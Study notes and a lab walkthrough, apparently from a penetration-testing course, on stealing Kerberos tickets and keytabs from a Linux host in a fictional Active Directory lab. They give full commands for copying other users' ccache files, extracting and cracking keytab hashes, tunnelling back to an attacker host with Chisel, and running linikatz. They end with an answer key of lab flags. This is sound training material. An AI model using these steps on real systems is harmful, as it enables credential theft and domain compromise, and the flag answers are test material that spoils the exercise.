# Pass the Ticket (PtT) — Linux

> **Module Section:** 22 / 26 — Password Attacks

## Overview

Linux machines can be joined to Active Directory (AD) for centralized identity management. When a Linux host is compromised, it may hold Kerberos tickets that can be stolen and used to move laterally. A Linux machine does not even need to be domain-joined to have useful tickets — scripts often use keytab files for automated Kerberos authentication.

---

## Kerberos on Linux

Ticket request flow is identical to Windows. Storage differs.

### Two Main Artifacts

| Artifact | Location | Purpose |
|----------|----------|---------|
| **ccache file** | `/tmp/krb5cc_*` (default) | Holds active Kerberos credentials for a session |
| **keytab file** | Varies (`.keytab` extension common) | Principal + encrypted key pairs for passwordless auth |

### Key Environment Variable

```bash
KRB5CCNAME=FILE:/tmp/krb5cc_<uid>_<rand>
```
> This environment variable tells Kerberos tools which ccache file to use. Set it before running impacket, smbclient, or evil-winrm to use the ticket you want.

This variable points Kerberos-aware tools to the active ticket cache.

### Keytab Notes

- Allows scripts to authenticate **without storing passwords in cleartext**
- Can be created on one host and **copied to another**
- **Must be regenerated** when the user's password changes
- `/etc/krb5.keytab` — machine account keytab (readable only by root → impersonate `LINUX01$`)

---

## Scenario

- **Target:** `LINUX01` (reachable only through `MS01`)
- **Access:** Port forward — SSH `MS01:2222` → `LINUX01:22`
- **Creds given:** `david@inlanefreight.htb / Password2`

```bash
ssh david@inlanefreight.htb@10.129.204.23 -p 2222
```
> Connects via SSH using sssd format: `user@realm@host`. Port 2222 is the forwarded port to LINUX01 through MS01. Use david's password `Password2` when prompted.

---

## Identifying AD Integration

### `realm list` — Cleanest Check

```bash
david@linux01:~$ realm list
inlanefreight.htb
  type: kerberos
  configured: kerberos-member
  client-software: sssd
  permitted-logins: david@inlanefreight.htb, julio@inlanefreight.htb
  permitted-groups: Linux Admins
```
> Shows the AD realm this host is joined to, what software handles authentication (sssd), and which users and groups are allowed to log in.

### Fallback: Check for SSSD / Winbind

```bash
ps -ef | grep -i "winbind\|sssd"
```
> Checks running processes for sssd (System Security Services Daemon) or winbind — both indicate AD integration. Either one present means the host authenticates against a domain.

Presence of `sssd_be`, `sssd_nss`, or `winbindd` confirms AD integration.

---

## Finding Kerberos Tickets

### A. Find Keytab Files

```bash
find / -name '*keytab*' -ls 2>/dev/null
```
> Searches the entire filesystem for files with "keytab" in the name and shows their permissions and owner. Check for world-readable or group-readable keytabs — those are immediately abusable.

Example output:
```
/etc/krb5.keytab                        (machine account — root only)
/opt/specialfiles/carlos.keytab         (service/user keytab)
```

> 💡 Keytabs might not always have `.keytab` extension. Check scripts referenced by **cronjobs** for keytab paths used with `kinit -k -t`:

```bash
crontab -l
# and
cat /path/to/script.sh
```
> Lists scheduled cron jobs, then reads the script to find the keytab path and principal. Cron scripts that authenticate to AD always reference a keytab and call `kinit`.

Typical pattern inside a script:

```bash
kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos/.scripts/svc_workstations.kt
smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls' -k -no-pass
```
> Shows the standard pattern: kinit authenticates using the keytab, then smbclient uses the resulting TGT with `-k` (Kerberos) and `-no-pass`.

### B. Find ccache Files

```bash
env | grep -i krb5       # Find current user's cache
ls -la /tmp              # Find all users' caches
```
> First command shows what ccache the current user is using. Second command lists `/tmp` where all user ccaches are stored by default — look for `krb5cc_*` files owned by other users.

Default naming: `krb5cc_<uid>_<random>`

> 🔐 ccache permissions are `0600` — need **root** or **target user** to read others' caches.

---

## Abusing Keytab Files

### Inspect a Keytab — `klist`

```bash
klist -k -t /opt/specialfiles/carlos.keytab
```
> Lists the Kerberos principals (user accounts) stored in the keytab file, with timestamps. This tells you who you can impersonate using this keytab.

```
KVNO Timestamp           Principal
   1 10/06/2022 17:09:13 carlos@INLANEFREIGHT.HTB
```

### Impersonate with `kinit`

```bash
# Backup your current ticket first!
cp "$KRB5CCNAME" /tmp/mybackup_ccache

# Impersonate Carlos using his keytab
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab

# Verify
klist
```
> Backs up the current ccache, then uses `kinit` with `-k` (keytab mode) and `-t` (keytab file path) to get a TGT for carlos. The realm must be uppercase. Run `klist` to confirm the new ticket is active.

> ⚠️ `kinit` is **case-sensitive** — username lowercase, realm uppercase.

### Use the Ticket

```bash
smbclient //dc01/carlos -k -c ls
```
> Lists the carlos share on dc01 using Kerberos authentication (`-k`). No password needed — the TGT from `kinit` handles it. `-c ls` runs the list command non-interactively.

---

## Extracting Hashes from a Keytab

### `keytabextract.py`

Extracts **NTLM + AES128 + AES256** hashes from 502-type keytab files.

```bash
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
```
> Extracts NTLM and AES hashes from the keytab file. The NTLM hash can be used for Pass-the-Hash or cracked offline. AES hashes can be used for OverPass-the-Hash.

```
REALM           : INLANEFREIGHT.HTB
SERVICE PRINCIPAL : carlos/
NTLM HASH       : a738f92b3c08b424ec2d99589a9cce60
AES-256 HASH    : 42ff0baa...
AES-128 HASH    : fa74d5abf4061baa1d4ff8485d1261c4
```

### What Can We Do With These?

| Hash | Attack |
|------|--------|
| **NTLM** | Pass the Hash / Crack with hashcat / crackstation.net |
| **AES-128 / AES-256** | OverPass the Hash (forge TGT with Rubeus) or crack |

> 💡 Keytab files can hold **multiple hashes for multiple users** (merged files).

### Quick Win — Crack NTLM

Upload NTLM hash to [crackstation.net](https://crackstation.net/). If it's a weak password, you get plaintext instantly.

```bash
su - carlos@inlanefreight.htb
```
> Switches to carlos's shell after cracking his NTLM hash to get the plaintext password. Use the cracked password when prompted.

---

## Abusing ccache Files

### Requirements
- **Read access** to the ccache file (own it, or be root)
- Ticket must still be within `Valid starting` → `Expires` window

### Import a ccache — Just Set `KRB5CCNAME`

```bash
cp /tmp/krb5cc_647401106_I8I133 /root/
export KRB5CCNAME=/root/krb5cc_647401106_I8I133
klist    # Confirms we are now 'julio'
smbclient //dc01/C$ -k -c ls -no-pass
```
> Copies julio's ccache file to a location you own, sets `KRB5CCNAME` to point to it, and verifies with `klist`. Then uses the ticket to list DC01's C$ share. `-no-pass` prevents a password prompt since Kerberos handles auth.

### Check Group Membership Before Using

```bash
id julio@inlanefreight.htb
# groups=...domain admins@inlanefreight.htb...
```
> Checks which groups the user belongs to before using the ticket. Finding "domain admins" in the output means the ticket gives Domain Admin-level access.

Finding a Domain Admin ccache in `/tmp` is a critical finding.

---

## Using Linux Tools with Kerberos from Attack Host

When attacking from a host not joined to the domain (e.g., Kali), you need four things:

1. Network reachability to the KDC/DC
2. DNS resolution (or hardcoded `/etc/hosts`)
3. A Kerberos config file (`/etc/krb5.conf`)
4. A valid ccache pointed to by `KRB5CCNAME`

### Step 1 — Hardcode `/etc/hosts`

```
172.16.1.10 inlanefreight.htb inlanefreight dc01.inlanefreight.htb dc01
172.16.1.5  ms01.inlanefreight.htb ms01
```

### Step 2 — Tunnel via Chisel + Proxychains

`/etc/proxychains.conf`:
```
[ProxyList]
socks5 127.0.0.1 1080
```

On attack host (server side):
```bash
sudo ./chisel server --reverse
```
> Starts a Chisel reverse tunnel server on the attack host. The pivot (MS01) will call out to this.

On MS01 (client side):
```cmd
C:\htb> c:\tools\chisel.exe client <ATTACKER_IP>:8080 R:socks
```
> Runs Chisel on the Windows pivot, connecting back to the attack host and creating a SOCKS5 proxy. After this, proxychains routes Kerberos traffic through the pivot.

### Step 3 — Set the ccache

```bash
export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
```
> Points Kerberos tools at the transferred ccache file. Strip the `FILE:` prefix if the file has one — some tools don't handle it.

> 💡 Strip the `FILE:` prefix if present — some tools don't handle it.

### Step 4 — Use Tools with Kerberos (`-k`)

**Impacket:**
```bash
proxychains impacket-wmiexec dc01 -k
# If prompted for password, also add -no-pass
```
> Runs impacket-wmiexec through the SOCKS proxy using the cached Kerberos ticket (`-k`). Add `-no-pass` if it still prompts. Use the hostname, not the IP.

**Evil-WinRM:**
```bash
# First install the package
sudo apt-get install krb5-user -y
```
> Installs the Kerberos client utilities (`kinit`, `klist`, etc.) needed for ticket-based auth from the attack host. Swap the package name for your distro's equivalent if not Debian-based.

Set realm in `/etc/krb5.conf`:
```ini
[libdefaults]
    default_realm = INLANEFREIGHT.HTB
[realms]
    INLANEFREIGHT.HTB = {
        kdc = dc01.inlanefreight.htb
    }
```

Then:
```bash
proxychains evil-winrm -i dc01 -r inlanefreight.htb
```

> ⚠️ Always use **hostnames** (e.g., `dc01`) not IPs — Kerberos auth requires the SPN to match.

---

## 7️⃣ Ticket Format Conversion

Move tickets between Linux and Windows formats.

### ccache ↔ kirbi

```bash
# Linux ccache → Windows kirbi
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi

# Windows kirbi → Linux ccache
impacket-ticketConverter julio.kirbi krb5cc_julio
```
> Converts a Kerberos ticket between Linux ccache and Windows `.kirbi` formats. Direction is auto-detected from the input file. Swap the filenames for your actual ticket files.

### Import Converted .kirbi on Windows

```cmd
C:\htb> C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
C:\htb> klist
```
> Injects the converted `.kirbi` ticket into the current Windows session with Rubeus, then `klist` confirms it. Swap the path for your converted ticket file.

---

## 8️⃣ Linikatz — Mimikatz for Linux

**Linikatz** extracts credentials from Linux/AD integrations (FreeIPA, SSSD, Samba, Vintella, PBIS).

### Requirements
- **Root privileges**

### Run

```bash
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
chmod +x linikatz.sh
./linikatz.sh
```
> Downloads and runs Linikatz to sweep the host for all Kerberos artifacts (ccache, keytab, SSSD cache, Samba secrets). Requires root. Results land in a `linikatz.*` output folder.

### What It Collects

- Kerberos tickets (ccache + keytab)
- Machine account tickets from `/var/lib/sss/db/ccache_*`
- Cached hashes
- Samba secrets

Output saved to a folder named `linikatz.*` with all artifacts separated by format.

---

## Tool Reference

| Tool | Purpose |
|------|---------|
| `realm list` | Check AD integration |
| `klist` | View current tickets / keytab info |
| `klist -k -t <keytab>` | List principals inside a keytab |
| `kinit -k -t <keytab> <user>` | Import keytab into session |
| `keytabextract.py` | Dump NTLM/AES hashes from keytab |
| `impacket-ticketConverter` | Convert ccache ↔ kirbi |
| `impacket-wmiexec -k` | Command execution with ticket |
| `evil-winrm -r <realm>` | WinRM shell with ticket |
| `linikatz.sh` | Mimikatz-like credential sweep |

---

## Common Ticket Locations

| Path | What's There |
|------|--------------|
| `/tmp/krb5cc_*` | User ccache files |
| `/etc/krb5.keytab` | Machine account keytab (root only) |
| `/etc/krb5.conf` | Kerberos client config |
| `/var/lib/sss/db/ccache_*` | **SSSD machine ticket cache** (goldmine) |
| `$KRB5CCNAME` | Current session cache location |

---

## Key Takeaways

1. **Linux hosts can hold Kerberos tickets** — joined or standalone
2. Two artifact types: **ccache** (session tickets) + **keytab** (principal + key pairs)
3. `KRB5CCNAME` is the single most important environment variable to check
4. `realm list` or `ps -ef | grep sssd` confirms AD integration
5. **Keytabs** can yield NTLM + AES hashes via `keytabextract.py` → PtH / OverPass / crack
6. **ccache files** in `/tmp` require root or owner to read — escalate first
7. `kinit -k -t` imports a keytab into the session; `klist` confirms
8. **`id <user>`** to check group membership before committing to use a ticket
9. When attacking from outside the domain: **hardcode `/etc/hosts`**, tunnel with chisel, update `/etc/krb5.conf`, always use **hostnames**
10. **`impacket-ticketConverter`** moves tickets between Linux (ccache) and Windows (kirbi)
11. **Linikatz** = Mimikatz equivalent — sweep for all Kerberos artifacts when root
12. `/var/lib/sss/db/ccache_*` contains the **machine account TGT** — impersonate `LINUX01$`

---

## Exercise

**Target:** `10.129.88.10` (LINUX01) — SSH on port `2222`
**Domain:** `inlanefreight.htb` (sssd-joined Ubuntu host) — DC at `dc01.inlanefreight.htb` / `172.16.1.10`
**Initial creds:** `david@inlanefreight.htb : Password2`

### Answers

| # | Question | Answer |
|---|----------|--------|
| 1 | Flag in david's home dir | `Gett1ng_Acc3$$_to_LINUX01` |
| 2 | Group permitted to login to LINUX01 | `Linux Admins` |
| 3 | Writable keytab file | `carlos.keytab` (`/opt/specialfiles/`) |
| 4 | Flag in carlos's home (cracked from keytab) | `C@rl0s_1$_H3r3` |
| 5 | Flag in svc_workstations home (via cron-dropped keytab) | `Mor3_4cce$$_m0r3_Pr1v$` |
| 6 | Flag in `/root/flag.txt` (sudo) | `Ro0t_Pwn_K3yT4b` |
| 7 | Flag from `\\DC01\julio` (ccache in `/tmp`) | `JuL1()_SH@re_fl@g` |
| 8 | Flag from `\\DC01\linux01` (LINUX01$ machine TGT) | `Us1nG_KeyTab_Like_@_PRO` |

---

### Q1 — david SSH access

```bash
ssh -p 2222 david@inlanefreight.htb@10.129.88.10   # Password2
cat ~/flag.txt                                     # → Gett1ng_Acc3$$_to_LINUX01
```

> 💡 SSH login format `<user>@<realm>@<host>` because sssd uses `login-formats: %U@inlanefreight.htb`.

---

### Q2 — Permitted group

```bash
realm list
# permitted-groups: Linux Admins
```
> Lists the AD realm config — the `permitted-groups` line answers which group is allowed to log into this host.

---

### Q3 — Writable keytab

```bash
find / -name "*.keytab" 2>/dev/null | while read f; do
  [ -r "$f" ] && [ -w "$f" ] && echo "RW: $f"
done
# RW: /opt/specialfiles/carlos.keytab
```

> ⚠️ World-writable keytab (`-rw-rw-rw-`) is a glaring misconfig — anyone on the box owns the principal it stores.

---

### Q4 — PtT to carlos via keytab → NTLM crack

**Step 1 — Copy keytab to attacker, extract hashes:**

```bash
scp -P 2222 david@inlanefreight.htb@10.129.88.10:/opt/specialfiles/carlos.keytab /tmp/
wget https://raw.githubusercontent.com/sosdave/KeyTabExtract/master/keytabextract.py
python3 keytabextract.py /tmp/carlos.keytab
# NTLM HASH: a738f92b3c08b424ec2d99589a9cce60
```
> Pulls the keytab to the attack host with SCP, downloads keytabextract.py, then dumps the NTLM/AES hashes from it. Swap the keytab path and SSH target for your environment.

**Step 2 — Crack NTLM with hashcat:**

```bash
echo 'a738f92b3c08b424ec2d99589a9cce60' > /tmp/carlos.ntlm
hashcat -m 1000 /tmp/carlos.ntlm /usr/share/wordlists/rockyou.txt
# → Password5
```
> Cracks the extracted NTLM hash with rockyou; `-m 1000` = NTLM. Swap the hash and wordlist for your target.

**Step 3 — SSH as carlos:**

```bash
ssh -p 2222 carlos@inlanefreight.htb@10.129.88.10   # Password5
cat ~/flag.txt   # → C@rl0s_1$_H3r3
id   # ...,linux admins → privileged group
```
> Logs in as carlos with the cracked password, reads his flag, and checks group membership with `id`. Swap the user/host for your target.

---

### Q5 — Pivot to svc_workstations via carlos's cron

Inspect carlos's environment:

```bash
cat /etc/crontab
# */5 * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh

ls -la ~/.scripts/
# john.keytab
# kerberos_script_test.sh
# svc_workstations.kt          (AES-only)
# svc_workstations._all.kt     (RC4 + AES128 + AES256)  ← has NTLM!

cat ~/.scripts/kerberos_script_test.sh
# kinit svc_workstations -k -t .../svc_workstations.kt
# smbclient //dc01/svc_workstations -k ... > script-test-results.txt
```
> Inspects carlos's cron job and its referenced script to find the keytab path and principal it authenticates as. Always read cron-referenced scripts for `kinit -k -t` keytab paths.

Pull the **`._all.kt`** version (contains RC4 → NTLM):

```bash
scp -P 2222 carlos@inlanefreight.htb@10.129.88.10:'/home/carlos@inlanefreight.htb/.scripts/svc_workstations._all.kt' /tmp/
python3 keytabextract.py /tmp/svc_workstations._all.kt
# NTLM: 7247e8d4387e76996ff3f18a34316fdd

hashcat -m 1000 <hash> rockyou.txt
# → Password4

ssh -p 2222 svc_workstations@inlanefreight.htb@10.129.88.10
cat ~/flag.txt   # → Mor3_4cce$$_m0r3_Pr1v$
```

> 💡 **AES-only keytab ≠ crackable.** Always check for the RC4 variant — it gives you the NTLM hash directly. If only AES is available, you can crack with `hashcat -m 19900` (Kerberos 5 AES256) but it requires the salt and is slower.

---

### Q6 — Root via sudo

```bash
sudo -l
# (ALL) ALL  ← unrestricted

sudo cat /root/flag.txt
# → Ro0t_Pwn_K3yT4b
```
> Checks sudo rights with `sudo -l` — `(ALL) ALL` means unrestricted root, so just `sudo cat` the root flag. Always run `sudo -l` after every pivot.

---

### Q7 — Steal julio's ccache from `/tmp`

When users authenticate via sssd/PAM, their TGT is stored as a `FILE:` ccache in `/tmp/krb5cc_<UID>_<random>`. As root we can read anyone's:

```bash
sudo ls -la /tmp/krb5cc_*
# -rw------- julio  /tmp/krb5cc_647401106_5f8kHr   ← TGT
# -rw------- julio  /tmp/krb5cc_647401106_HRJDux

sudo cp /tmp/krb5cc_647401106_5f8kHr /tmp/julio.ccache
sudo chmod 644 /tmp/julio.ccache

export KRB5CCNAME=/tmp/julio.ccache
klist
# Default principal: julio@INLANEFREIGHT.HTB
# krbtgt/INLANEFREIGHT.HTB

smbclient //dc01/julio -k -c "get julio.txt /tmp/julio.txt"
cat /tmp/julio.txt   # → JuL1()_SH@re_fl@g
```

> ⚠️ **FQDN gotcha:** `smbclient //dc01.inlanefreight.htb/julio -k` hangs silently on this Samba 4.13 / sssd combo. Use the **short hostname** `//dc01/julio` — Kerberos will canonicalize via realm config.

---

### Q8 — LINUX01$ machine account TGT

Every domain-joined Linux host has a machine keytab at `/etc/krb5.keytab` readable only by root. Use it to mint a TGT for the computer account:

```bash
sudo klist -k /etc/krb5.keytab
#   2  LINUX01$@INLANEFREIGHT.HTB
#   2  host/LINUX01@INLANEFREIGHT.HTB
#   2  host/linux01.inlanefreight.htb@INLANEFREIGHT.HTB

sudo bash -c 'KRB5CCNAME=/tmp/linux01.ccache kinit -k LINUX01\$ && chmod 644 /tmp/linux01.ccache'

export KRB5CCNAME=/tmp/linux01.ccache
klist
# Default principal: LINUX01$@INLANEFREIGHT.HTB

smbclient //dc01/linux01 -k -c "get flag.txt /tmp/linux01_flag.txt"
cat /tmp/linux01_flag.txt
# → Us1nG_KeyTab_Like_@_PRO   (file has UTF-16 BOM, strip if needed)
```

> 💡 `kinit -k LINUX01$` (escape `$` as `\$` in bash) reads the host's machine secret from `/etc/krb5.keytab` and requests a TGT for the computer account. Many AD shares grant access to `Domain Computers` — abuse that.

---

### Lessons Learned

1. **sssd login format** is `<user>@<realm>@<host>` for SSH — easy to forget vs. local `<user>@<host>`.
2. **`realm list`** dumps `permitted-groups` / `permitted-logins` — fastest path to enumerate AD access controls on a Linux host.
3. **World-writable `.keytab` files** are a single-find gold mine. Always check r+w on every keytab.
4. **`keytabextract.py`** pulls NTLM (from RC4-HMAC entry), AES128, AES256 hashes from any `.keytab`.
5. **AES-only keytab vs `_all.kt`** — if RC4 entry is missing you only get AES, which crack-times >> NTLM. Look for sibling `*._all.kt` or older keytab versions.
6. **Cron jobs run as user X** often drop fresh keytabs / ccaches readable by X. Watch `~/.scripts/`, `~/.cache/`, `/var/spool/`.
7. **`/tmp/krb5cc_<UID>_<rand>`** ccaches persist for the lifetime of the user's session — `sudo cp` + `KRB5CCNAME=<file>` impersonates them without ever knowing the password.
8. **Short hostname > FQDN** for `smbclient -k` when Samba/sssd misbehave on canonicalization. Test both.
9. **`/etc/krb5.keytab`** stores the host's machine account secret — `sudo kinit -k LINUX01$` mints a TGT for `LINUX01$@DOMAIN`. Machine accounts often have lateral SMB read access on AD shares.
10. **Escape `$` in bash** when invoking `kinit -k MACHINE$` — use `MACHINE\$` or single quotes.
11. **`(ALL) ALL` sudo on a service account** = full chain compromise. Check `sudo -l` after every pivot.
12. **PAM-cached ccaches outlive the SSH session** — left-behind tickets in `/tmp` are a recurring gift.

---

## References

- [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)
- [Linikatz (Cisco CX Security)](https://github.com/CiscoCXSecurity/linikatz)
- [Impacket](https://github.com/fortra/impacket)
- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
- [Chisel](https://github.com/jpillora/chisel)
- [Crackstation](https://crackstation.net/)
